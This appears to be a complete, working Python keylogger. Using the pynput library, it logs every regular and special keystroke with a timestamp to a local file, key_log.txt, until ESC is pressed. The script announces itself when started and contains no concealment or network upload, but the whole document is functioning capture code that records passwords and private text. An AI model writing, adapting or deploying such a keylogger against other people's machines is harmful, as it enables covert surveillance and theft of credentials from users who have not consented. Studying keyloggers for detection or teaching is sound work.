from pynput import keyboard
import os
import logging

# Setup logging to capture keystrokes in a file
LOG_FILE = "key_log.txt"
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG,
    format="%(asctime)s: %(message)s",
)

def on_press(key):
    """
    Function to handle key press events.
    Logs the key pressed to the file.
    """
    try:
        # Log regular characters
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        # Log special keys (e.g., space, shift, etc.)
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    """
    Function to handle key release events.
    Stops the keylogger when ESC is pressed.
    """
    if key == keyboard.Key.esc:
        # Stop the listener when ESC is pressed
        logging.info("Keylogger stopped.")
        return False

if __name__ == "__main__":
    print("Key logger started... Press ESC to stop.")
    print(f"Logs will be saved in: {os.path.abspath(LOG_FILE)}")

    # Start listening to the keyboard
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

